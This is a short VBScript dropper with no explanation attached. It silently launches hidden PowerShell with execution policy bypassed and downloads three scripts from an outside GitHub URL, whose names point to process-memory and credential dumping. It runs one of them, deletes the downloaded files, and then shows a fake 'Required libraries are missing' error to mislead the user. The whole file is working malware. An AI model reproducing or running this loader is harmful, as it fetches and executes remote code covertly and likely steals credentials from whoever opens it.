dim objShell,evil
Set objShell = CreateObject("Wscript.shell")

evil = "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/kahlon81/Power/master/Get-ProcessMiniDump.ps1','C:\Windows\Temp\1234.ps1')"
objShell.run evil,0

WScript.Sleep 1000

evil = "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/kahlon81/Power/master/Dump.ps1','C:\Windows\Temp\abcd.ps1')"
objShell.run evil,0

WScript.Sleep 1000

evil = "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/kahlon81/Power/master/DumpRunAs.ps1','C:\Windows\Temp\xyz.ps1')"
objShell.run evil,0

WScript.Sleep 1000

evil = "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -file C:\Windows\Temp\xyz.ps1"
objShell.run evil,0

WScript.Sleep 1000

evil = "cmd.exe /c ""del C:\Windows\Temp\1234.ps1,C:\Windows\Temp\abcd.ps1,C:\Windows\Temp\xyz.ps1"" "
objShell.run evil,0

MsgBox "Required libraries are missing.."